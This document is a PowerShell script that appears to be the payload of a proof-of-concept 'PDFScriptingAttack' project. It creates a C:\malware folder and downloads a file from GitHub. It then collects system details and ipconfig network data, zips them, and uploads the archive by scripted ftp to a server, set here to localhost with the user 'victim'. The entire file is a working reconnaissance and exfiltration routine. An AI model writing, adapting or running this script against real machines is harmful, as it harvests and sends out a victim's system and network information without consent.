﻿if (-not (Test-Path -Path "C:\malware")){
    New-Item -Path 'C:\malware' -ItemType Directory
}
if (-not (Test-Path -Path "C:\malware\export")){
    New-Item -Path 'C:\malware\export' -ItemType Directory
}
Invoke-WebRequest -Uri https://raw.githubusercontent.com/lewisk1899/PDFScriptingAttack/master/README.md -OutFile C:\malware\README.md
Get-WmiObject -Class Win32_ComputerSystem | Out-file -FilePath "C:\malware\export\systeminfo.txt"
ipconfig | Out-file -FilePath "C:\malware\export\netinfo.txt"



if(-not (Test-Path -Path "C:\malware\export.Zip")){
$compress = @{
  Path = "C:\malware\export"
  CompressionLevel = "Fastest"
  DestinationPath = "C:\malware\export.Zip"
}
Compress-Archive @compress

}

$file = "C:\malware\export.Zip"
$server = "localhost"
$user = "victim"
$password = ""
$dir = "\"

"open $server
user $user 
$password
" + "send 
C:\malware\export.Zip
export.Zip
"  | ftp -in

